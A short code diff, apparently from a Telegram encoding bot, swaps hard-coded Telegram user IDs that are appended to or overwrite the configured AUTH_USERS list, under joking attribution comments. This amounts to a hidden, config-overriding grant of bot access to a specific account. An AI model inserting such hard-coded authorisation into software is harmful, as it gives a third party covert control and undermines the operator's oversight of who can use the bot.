@@ -22,7 +22,7 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1666551439)
+AUTH_USERS.append(452118981)
 # again lol (c) @Animes_Encoded 
 
 SESSION_NAME = Config.SESSION_NAME
@@ -46,7 +46,7 @@ size = []
 metadata = []
 metadata1 = []
 metadata2 = []
-AUTH_USERS = [6748415360]
+AUTH_USERS = [452118981]
 name = []
 resolution = []
 audio_b = []
